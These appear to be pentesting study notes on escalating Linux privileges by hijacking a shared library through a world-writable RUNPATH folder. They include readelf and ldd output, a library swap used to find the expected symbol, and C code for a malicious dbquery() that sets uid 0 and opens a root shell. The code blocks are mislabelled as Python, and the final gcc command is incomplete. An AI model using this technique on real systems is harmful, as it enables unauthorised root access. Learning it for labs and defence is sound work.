- Under development binaries/programs usually have custom libraries associated with them.
- we can use `ldd` command to list out the shared object required by a binary or shared object
- check for non standard libraries

**It is possible to load shared libraries from custom locations, Libraries in `RUNPATH` folder are given preference over other folders.
- this can be inspected using `readelf` utility.

```python
readelf -d payroll | grep PATH

#output
0x000000000000001d (RUNPATH) Library runpath: [/development]
```
- in the above example the RUNPATH config allows loading libraries from /development folder which is writable by all users.
- This misconfiguration can be exploited by placing a malicious library in that folder which will take precedence over other folders.
**Before compiling the library we need to find the function name called by the binary
```python
ldd payroll

#output
linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

- we can see that the a library is used from a non standard folder `development`, now lets trigger an error by changing the file `libshared.so` to a different library file just to see what functions the library is expecting:
```python
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```python
./payroll
#output
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
#we can see that the dbquery function is expected by the library and since it's missing, we are getting an error.
```
- Lets create a shared object which includes this function (dbquery())
```python
#include<stdio.h>
#include<stdlib.h> 
#include<unistd.h> 
void dbquery() 
{ 
printf("Malicious library loaded\n"); 
setuid(0); 
system("/bin/sh -p"); 
}

# This function sets our user id to 0 and executes the /bin/sh when called
```

```python
#compiling it 
gcc src.c -fPIC -shared -o
```
